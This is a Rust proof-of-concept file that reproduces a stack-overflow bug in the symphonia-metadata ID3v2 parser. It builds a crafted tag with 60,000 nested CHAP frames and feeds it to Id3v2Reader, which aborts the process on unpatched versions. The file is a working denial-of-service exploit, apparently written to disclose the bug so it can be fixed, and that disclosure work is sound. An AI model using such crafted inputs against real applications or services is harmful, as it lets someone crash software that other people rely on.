//! Standalone reproduction for: unbounded recursion (stack overflow) in ID3v2 CHAP/CTOC frame
//! parsing (symphonia-metadata).
//!
//! Builds a small ID3v2.3 tag containing 60,000 recursively nested `CHAP` frames (each level only
//! costs 27 bytes: a 10-byte ID3v2.3 frame header + 17 bytes of mandatory CHAP fields), then feeds
//! it to `Id3v2Reader`, the real public entry point a container format reader (or an application
//! embedding symphonia) uses to parse a standalone/embedded ID3v2 tag. On the unpatched tree this
//! aborts the process with a stack overflow instead of returning a `Result`.

use std::io::Cursor;

use symphonia_core::io::MediaSourceStream;
use symphonia_core::meta::{MetadataOptions, MetadataReader};
use symphonia_metadata::id3v2::Id3v2Reader;

fn build_malicious_id3v2_tag(n_levels: usize) -> Vec<u8> {
    fn chap_body(inner_frame_bytes: &[u8]) -> Vec<u8> {
        let mut body = vec![0u8]; // Element ID: empty string (just the null terminator).
        body.extend_from_slice(&0u32.to_be_bytes()); // start_ms
        body.extend_from_slice(&0u32.to_be_bytes()); // end_ms
        body.extend_from_slice(&0xFFFF_FFFFu32.to_be_bytes()); // start_byte = None
        body.extend_from_slice(&0xFFFF_FFFFu32.to_be_bytes()); // end_byte = None
        body.extend_from_slice(inner_frame_bytes);
        body
    }

    fn frame(id: &[u8; 4], body: &[u8]) -> Vec<u8> {
        let mut out = Vec::with_capacity(10 + body.len());
        out.extend_from_slice(id);
        out.extend_from_slice(&(body.len() as u32).to_be_bytes());
        out.extend_from_slice(&[0u8, 0u8]); // flags
        out.extend_from_slice(body);
        out
    }

    let mut inner: Vec<u8> = Vec::new();
    for _ in 0..n_levels {
        let body = chap_body(&inner);
        inner = frame(b"CHAP", &body);
    }

    let mut out = Vec::new();
    out.extend_from_slice(b"ID3");
    out.push(3); // major version
    out.push(0); // minor version
    out.push(0); // flags
    let size = inner.len() as u32;
    // 28-bit syncsafe size.
    out.push(((size >> 21) & 0x7f) as u8);
    out.push(((size >> 14) & 0x7f) as u8);
    out.push(((size >> 7) & 0x7f) as u8);
    out.push((size & 0x7f) as u8);
    out.extend_from_slice(&inner);
    out
}

fn main() {
    let data = build_malicious_id3v2_tag(60_000);
    println!("crafted ID3v2 tag: {} bytes, 60000 nested CHAP frames", data.len());

    let mss = MediaSourceStream::new(Box::new(Cursor::new(data)), Default::default());

    let mut reader = Id3v2Reader::try_new(mss, MetadataOptions::default())
        .expect("failed to construct Id3v2Reader");

    match reader.read_all() {
        Ok(_) => println!("parsed OK (no crash)"),
        Err(e) => println!("parse error (no crash): {e}"),
    }
}
